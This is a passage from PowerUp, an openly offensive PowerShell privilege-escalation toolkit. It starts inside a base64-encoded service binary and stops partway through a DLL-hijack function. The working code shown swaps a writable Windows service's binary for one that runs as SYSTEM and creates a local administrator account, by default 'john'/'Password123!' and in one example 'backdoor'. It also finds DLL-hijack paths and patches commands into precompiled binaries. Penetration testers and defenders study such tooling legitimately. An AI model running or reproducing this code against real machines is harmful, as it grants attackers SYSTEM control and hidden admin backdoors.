IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAAA9jAG0AZAAuAGUAeABlAABwlQEkfW6TS5S/gwmLKZ5MAAiwP19/EdUKOgi3elxWGTTgiQMGEg0EIAEBAgMgAAEFIAEBHQ4DAAABBCABAQ4FIAEBEUkEIAEBCAMgAA4GAAISYQ4OBAABAQgDBwEOBgABAR0SBQgHAh0SBR0SBQwBAAdVcGRhdGVyAAAFAQAAAAAXAQASQ29weXJpZ2h0IMKpICAyMDE1AAApAQAkN2NhMWIzMmEtOWMzNy00MTViLWJkOWYtZGRmNDE5OWUxNmVj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"
        [Byte[]] $Binary = [Byte[]][Convert]::FromBase64String($B64Binary)

        if ($PSBoundParameters['Command']) {
            $ServiceCommand = $Command
        }
        else {
            if ($PSBoundParameters['Credential']) {
                $UserNameToAdd = $Credential.UserName
                $PasswordToAdd = $Credential.GetNetworkCredential().Password
            }
            else {
                $UserNameToAdd = $UserName
                $PasswordToAdd = $Password
            }

            if ($UserNameToAdd.Contains('\')) {
                # only adding a domain user to the local group, no user creation
                $ServiceCommand = "net localgroup $LocalGroup $UserNameToAdd /add"
            }
            else {
                # create a local user and add it to the local specified group
                $ServiceCommand = "net user $UserNameToAdd $PasswordToAdd /add && timeout /t 5 && net localgroup $LocalGroup $UserNameToAdd /add"
            }
        }
    }

    PROCESS {

        $TargetService = Get-Service -Name $Name

        # get the unicode byte conversions of all arguments
        $Enc = [System.Text.Encoding]::Unicode
        $ServiceNameBytes = $Enc.GetBytes($TargetService.Name)
        $CommandBytes = $Enc.GetBytes($ServiceCommand)

        # patch all values in to their appropriate locations
        for ($i=0; $i -lt ($ServiceNameBytes.Length); $i++) {
            # service name offset = 2458
            $Binary[$i+2458] = $ServiceNameBytes[$i]
        }
        for ($i=0; $i -lt ($CommandBytes.Length); $i++) {
            # cmd offset = 2535
            $Binary[$i+2535] = $CommandBytes[$i]
        }

        Set-Content -Value $Binary -Encoding Byte -Path $Path -Force -ErrorAction Stop

        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'ServiceName' $TargetService.Name
        $Out | Add-Member Noteproperty 'Path' $Path
        $Out | Add-Member Noteproperty 'Command' $ServiceCommand
        $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ServiceBinary')
        $Out
    }
}


function Install-ServiceBinary {
<#
.SYNOPSIS

Replaces the service binary for the specified service with one that executes
a specified command as SYSTEM.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-ServiceDetail, Get-ModifiablePath, Write-ServiceBinary  

.DESCRIPTION

Takes a service Name or a ServiceProcess.ServiceController on the pipeline where the
current user can  modify the associated service binary listed in the binPath. Backs up
the original service binary to "OriginalService.exe.bak" in service binary location,
and then uses Write-ServiceBinary to create a C# service binary that either adds
a local administrator user or executes a custom command. The new service binary is
replaced in the original service binary path, and a custom object is returned that
captures the original and new service binary configuration.

.PARAMETER Name

The service name the EXE will be running under.

.PARAMETER UserName

The [domain\]username to add. If not given, it defaults to "john".
Domain users are not created, only added to the specified localgroup.

.PARAMETER Password

The password to set for the added user. If not given, it defaults to "Password123!"

.PARAMETER LocalGroup

Local group name to add the user to (default of 'Administrators').

.PARAMETER Credential

A [Management.Automation.PSCredential] object specifying the user/password to add.

.PARAMETER Command

Custom command to execute instead of user creation.

.EXAMPLE

Install-ServiceBinary -Name VulnSVC

Backs up the original service binary to SERVICE_PATH.exe.bak and replaces the binary
for VulnSVC with one that adds a local Administrator (john/Password123!).

.EXAMPLE

Get-Service VulnSVC | Install-ServiceBinary

Backs up the original service binary to SERVICE_PATH.exe.bak and replaces the binary
for VulnSVC with one that adds a local Administrator (john/Password123!).

.EXAMPLE

Install-ServiceBinary -Name VulnSVC -UserName 'TESTLAB\john'

Backs up the original service binary to SERVICE_PATH.exe.bak and replaces the binary
for VulnSVC with one that adds TESTLAB\john to the Administrators local group.

.EXAMPLE

Install-ServiceBinary -Name VulnSVC -UserName backdoor -Password Password123!

Backs up the original service binary to SERVICE_PATH.exe.bak and replaces the binary
for VulnSVC with one that adds a local Administrator (backdoor/Password123!).

.EXAMPLE

Install-ServiceBinary -Name VulnSVC -Command "net ..."

Backs up the original service binary to SERVICE_PATH.exe.bak and replaces the binary
for VulnSVC with one that executes a custom command.

.OUTPUTS

PowerUp.ServiceBinary.Installed
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingUserNameAndPassWordParams', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerUp.ServiceBinary.Installed')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ServiceName')]
        [String]
        [ValidateNotNullOrEmpty()]
        $Name,

        [String]
        $UserName = 'john',

        [String]
        $Password = 'Password123!',

        [String]
        $LocalGroup = 'Administrators',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [String]
        [ValidateNotNullOrEmpty()]
        $Command
    )

    BEGIN {
        if ($PSBoundParameters['Command']) {
            $ServiceCommand = $Command
        }
        else {
            if ($PSBoundParameters['Credential']) {
                $UserNameToAdd = $Credential.UserName
                $PasswordToAdd = $Credential.GetNetworkCredential().Password
            }
            else {
                $UserNameToAdd = $UserName
                $PasswordToAdd = $Password
            }

            if ($UserNameToAdd.Contains('\')) {
                # only adding a domain user to the local group, no user creation
                $ServiceCommand = "net localgroup $LocalGroup $UserNameToAdd /add"
            }
            else {
                # create a local user and add it to the local specified group
                $ServiceCommand = "net user $UserNameToAdd $PasswordToAdd /add && timeout /t 5 && net localgroup $LocalGroup $UserNameToAdd /add"
            }
        }
    }

    PROCESS {
        $TargetService = Get-Service -Name $Name -ErrorAction Stop
        $ServiceDetails = $TargetService | Get-ServiceDetail
        $ModifiableFiles = $ServiceDetails.PathName | Get-ModifiablePath -Literal

        if (-not $ModifiableFiles) {
            throw "Service binary '$($ServiceDetails.PathName)' for service $($ServiceDetails.Name) not modifiable by the current user."
        }

        $ServicePath = $ModifiableFiles | Select-Object -First 1 | Select-Object -ExpandProperty ModifiablePath
        $BackupPath = "$($ServicePath).bak"

        Write-Verbose "Backing up '$ServicePath' to '$BackupPath'"

        try {
            Copy-Item -Path $ServicePath -Destination $BackupPath -Force
        }
        catch {
            Write-Warning "Error backing up '$ServicePath' : $_"
        }

        $Result = Write-ServiceBinary -Name $ServiceDetails.Name -Command $ServiceCommand -Path $ServicePath
        $Result | Add-Member Noteproperty 'BackupPath' $BackupPath
        $Result.PSObject.TypeNames.Insert(0, 'PowerUp.ServiceBinary.Installed')
        $Result
    }
}


function Restore-ServiceBinary {
<#
.SYNOPSIS

Restores a service binary backed up by Install-ServiceBinary.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-ServiceDetail, Get-ModifiablePath  

.DESCRIPTION

Takes a service Name or a ServiceProcess.ServiceController on the pipeline and
checks for the existence of an "OriginalServiceBinary.exe.bak" in the service
binary location. If it exists, the backup binary is restored to the original
binary path.

.PARAMETER Name

The service name to restore a binary for.

.PARAMETER BackupPath

Optional manual path to the backup binary.

.EXAMPLE

Restore-ServiceBinary -Name VulnSVC

Restore the original binary for the service 'VulnSVC'.

.EXAMPLE

Get-Service VulnSVC | Restore-ServiceBinary

Restore the original binary for the service 'VulnSVC'.

.EXAMPLE

Restore-ServiceBinary -Name VulnSVC -BackupPath 'C:\temp\backup.exe'

Restore the original binary for the service 'VulnSVC' from a custom location.

.OUTPUTS

PowerUp.ServiceBinary.Installed
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.ServiceBinary.Restored')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ServiceName')]
        [String]
        [ValidateNotNullOrEmpty()]
        $Name,

        [Parameter(Position = 1)]
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $BackupPath
    )

    PROCESS {
        $TargetService = Get-Service -Name $Name -ErrorAction Stop
        $ServiceDetails = $TargetService | Get-ServiceDetail
        $ModifiableFiles = $ServiceDetails.PathName | Get-ModifiablePath -Literal

        if (-not $ModifiableFiles) {
            throw "Service binary '$($ServiceDetails.PathName)' for service $($ServiceDetails.Name) not modifiable by the current user."
        }

        $ServicePath = $ModifiableFiles | Select-Object -First 1 | Select-Object -ExpandProperty ModifiablePath
        $BackupPath = "$($ServicePath).bak"

        Copy-Item -Path $BackupPath -Destination $ServicePath -Force
        Remove-Item -Path $BackupPath -Force

        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'ServiceName' $ServiceDetails.Name
        $Out | Add-Member Noteproperty 'ServicePath' $ServicePath
        $Out | Add-Member Noteproperty 'BackupPath' $BackupPath
        $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ServiceBinary.Restored')
        $Out
    }
}


########################################################
#
# DLL Hijacking
#
########################################################

function Find-ProcessDLLHijack {
<#
.SYNOPSIS

Finds all DLL hijack locations for currently running processes.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Enumerates all currently running processes with Get-Process (or accepts an
input process object from Get-Process) and enumerates the loaded modules for each.
All loaded module name exists outside of the process binary base path, as those
are DLL load-order hijack candidates.

.PARAMETER Name

The name of a process to enumerate for possible DLL path hijack opportunities.

.PARAMETER ExcludeWindows

Exclude paths from C:\Windows\* instead of just C:\Windows\System32\*

.PARAMETER ExcludeProgramFiles

Exclude paths from C:\Program Files\* and C:\Program Files (x86)\*

.PARAMETER ExcludeOwned

Exclude processes the current user owns.

.EXAMPLE

Find-ProcessDLLHijack

Finds possible hijackable DLL locations for all processes.

.EXAMPLE

Get-Process VulnProcess | Find-ProcessDLLHijack

Finds possible hijackable DLL locations for the 'VulnProcess' processes.

.EXAMPLE

Find-ProcessDLLHijack -ExcludeWindows -ExcludeProgramFiles

Finds possible hijackable DLL locations not in C:\Windows\* and
not in C:\Program Files\* or C:\Program Files (x86)\*

.EXAMPLE

Find-ProcessDLLHijack -ExcludeOwned

Finds possible hijackable DLL location for processes not owned by the
current user.

.OUTPUTS

PowerUp.HijackableDLL.Process

.LINK

https://www.mandiant.com/blog/malware-persistence-windows-registry/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.HijackableDLL.Process')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ProcessName')]
        [String[]]
        $Name = $(Get-Process | Select-Object -Expand Name),

        [Switch]
        $ExcludeWindows,

        [Switch]
        $ExcludeProgramFiles,

        [Switch]
        $ExcludeOwned
    )

    BEGIN {
        # the known DLL cache to exclude from our findings
        #   http://blogs.msdn.com/b/larryosterman/archive/2004/07/19/187752.aspx
        $Keys = (Get-Item "HKLM:\System\CurrentControlSet\Control\Session Manager\KnownDLLs")
        $KnownDLLs = $(ForEach ($KeyName in $Keys.GetValueNames()) { $Keys.GetValue($KeyName).tolower() }) | Where-Object { $_.EndsWith(".dll") }
        $KnownDLLPaths = $(ForEach ($name in $Keys.GetValueNames()) { $Keys.GetValue($name).tolower() }) | Where-Object { -not $_.EndsWith(".dll") }
        $KnownDLLs += ForEach ($path in $KnownDLLPaths) { ls -force $path\*.dll | Select-Object -ExpandProperty Name | ForEach-Object { $_.tolower() }}
        $CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

        # get the owners for all processes
        $Owners = @{}
        Get-WmiObject -Class win32_process | Where-Object {$_} | ForEach-Object { $Owners[$_.handle] = $_.getowner().user }
    }

    PROCESS {

        ForEach ($ProcessName in $Name) {

            $TargetProcess = Get-Process -Name $ProcessName

            if ($TargetProcess -and $TargetProcess.Path -and ($TargetProcess.Path -ne '') -and ($Null -ne $TargetProcess.Path)) {

                try {
                    $BasePath = $TargetProcess.Path | Split-Path -Parent
                    $LoadedModules = $TargetProcess.Modules
                    $ProcessOwner = $Owners[$TargetProcess.Id.ToString()]

                    ForEach ($Module in $LoadedModules){

                        $ModulePath = "$BasePath\$($Module.ModuleName)"

                        # if the module path doesn't exist in the process base path folder
                        if ((-not $ModulePath.Contains('C:\Windows\System32')) -and (-not (Test-Path -Path $ModulePath)) -and ($KnownDLLs -NotContains $Module.ModuleName)) {

                            $Exclude = $False

                            if ($PSBoundParameters['ExcludeWindows'] -and $ModulePath.Contains('C:\Windows')) {
                                $Exclude = $True
                            }

                            if ($PSBoundParameters['ExcludeProgramFiles'] -and $ModulePath.Contains('C:\Program Files')) {
                                $Exclude = $True
                            }

                            if ($PSBoundParameters['ExcludeOwned'] -and $CurrentUser.Contains($ProcessOwner)) {
                                $Exclude = $True
                            }

                            # output the process name and hijackable path if exclusion wasn't marked
                            if (-not $Exclude){
                                $Out = New-Object PSObject
                                $Out | Add-Member Noteproperty 'ProcessName' $TargetProcess.ProcessName
                                $Out | Add-Member Noteproperty 'ProcessPath' $TargetProcess.Path
                                $Out | Add-Member Noteproperty 'ProcessOwner' $ProcessOwner
                                $Out | Add-Member Noteproperty 'ProcessHijackableDLL' $ModulePath
                                $Out.PSObject.TypeNames.Insert(0, 'PowerUp.HijackableDLL.Process')
                                $Out
                            }
                        }
                    }
                }
                catch {
                    Write-Verbose "Error: $_"
                }
            }
        }
    }
}


function Find-PathDLLHijack {
<#
.SYNOPSIS

Finds all directories in the system %PATH% that are modifiable by the current user.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-ModifiablePath  

.DESCRIPTION

Enumerates the paths stored in Env:Path (%PATH) and filters each through Get-ModifiablePath
to return the folder paths the current user can write to. On Windows 7, if wlbsctrl.dll is
written to one of these paths, execution for the IKEEXT can be hijacked due to DLL search
order loading.

.EXAMPLE

Find-PathDLLHijack

Finds all %PATH% .DLL hijacking opportunities.

.OUTPUTS

PowerUp.HijackableDLL.Path

.LINK

http://www.greyhathacker.net/?p=738
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.HijackableDLL.Path')]
    [CmdletBinding()]
    Param()

    # use -Literal so the spaces in %PATH% folders are not tokenized
    Get-Item Env:Path | Select-Object -ExpandProperty Value | ForEach-Object { $_.split(';') } | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
        $TargetPath = $_
        $ModifidablePaths = $TargetPath | Get-ModifiablePath -Literal | Where-Object {$_ -and ($Null -ne $_) -and ($Null -ne $_.ModifiablePath) -and ($_.ModifiablePath.Trim() -ne '')}
        ForEach ($ModifidablePath in $ModifidablePaths) {
            if ($Null -ne $ModifidablePath.ModifiablePath) {
                $ModifidablePath | Add-Member Noteproperty '%PATH%' $_
                $ModifidablePath | Add-Member Aliasproperty Name '%PATH%'
                $ModifidablePath.PSObject.TypeNames.Insert(0, 'PowerUp.HijackableDLL.Path')
                $ModifidablePath
            }
        }
    }
}


function Write-HijackDll {
<#
.SYNOPSIS

Patches in the path to a specified .bat (containing the specified command) into a
pre-compiled hijackable C++ DLL writes the DLL out to the specified ServicePath location.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

First builds a self-deleting .bat file that executes the specified -Command or local user,
to add and writes the.bat out to -BatPath. The BatPath is then patched into a pre-compiled
C++ DLL that is built to be hijackable by the IKEEXT service. There are two DLLs, one for
x86 and one for x64, and both are contained as base64-encoded strings. The DLL is then
written out to the specified OutputFile.

.PARAMETER DllPath

File name to write the generated DLL out to.

.PARAMETER Architecture

The Architecture to generate for the DLL, x86 or x64. If not specified, PowerUp
will try to automatically determine the correct architecture.

.PARAMETER BatPath

Path to the .bat for the DLL to launch.

.PARAMETER UserName

The [domain\]username to add. If not given, it defaults to "john".
Domain users are not created, only added to the specified localgroup.

.PARAMETER Password

The password to set for the added user. If not given, it defaults to "Password123!"

.PARAMETER LocalGroup

Local group name to add the user to (default of 'Administrators').

.PARAMETER Credential

A [Management.Automation.PSCredential] object specifying the user/password to add.

.PARAMETER Command

Custom command to execute instead of user creation.

.OUTPUTS

PowerUp.HijackableDLL
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingUserNameAndPassWordParams', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerUp.HijackableDLL')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $DllPath,

        [String]
        [ValidateSet('x86', 'x64')]
        $Architecture,

        [String]
        [ValidateNotNullOrEmpty()]
        $BatPath,

        [String]
        $UserName = 'john',

        [String]
        $Password = 'Password123!',

        [String]
        $LocalGroup = 'Administrators',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [String]
        [ValidateNotNullOrEmpty()]
        $Command
    )

    function local:Invoke-PatchDll {
    <#
    .SYNOPSIS

    Helpers that patches a string in a binary byte array.

    .PARAMETER DllBytes

    The binary blob to patch.

    .PARAMETER SearchString

    The string to replace in the blob.

    .PARAMETER ReplaceString

    The string to replace SearchString with.
    #>

        [OutputType('System.Byte[]')]
        [CmdletBinding()]
        Param(
            [Parameter(Mandatory = $True)]
            [Byte[]]
            $DllBytes,

            [Parameter(Mandatory = $True)]
            [String]
            $SearchString,

            [Parameter(Mandatory = $True)]
            [String]
            $ReplaceString
        )

        $ReplaceStringBytes = ([System.Text.Encoding]::UTF8).GetBytes($ReplaceString)

        $Index = 0
        $S = [System.Text.Encoding]::ASCII.GetString($DllBytes)
        $Index = $S.IndexOf($SearchString)

        if ($Index -eq 0) {
            throw("Could not find string $SearchString !")
        }

        for ($i=0; $i -lt $ReplaceStringBytes.Length; $i++) {
            $DllBytes[$Index+$i]=$ReplaceStringBytes[$i]
        }

        return $DllBytes
    }

    if ($PSBoundParameters['Command']) {
        $BatCommand = $Command
    }
    else {
        if ($PSBoundParameters['Credential']) {
            $UserNameToAdd = $Credential.UserName
            $PasswordToAdd = $Credential.GetNetworkCredential().Password
        }
        else {
            $UserNameToAdd = $UserName
            $PasswordToAdd = $Password
        }

        if ($UserNameToAdd.Contains('\')) {
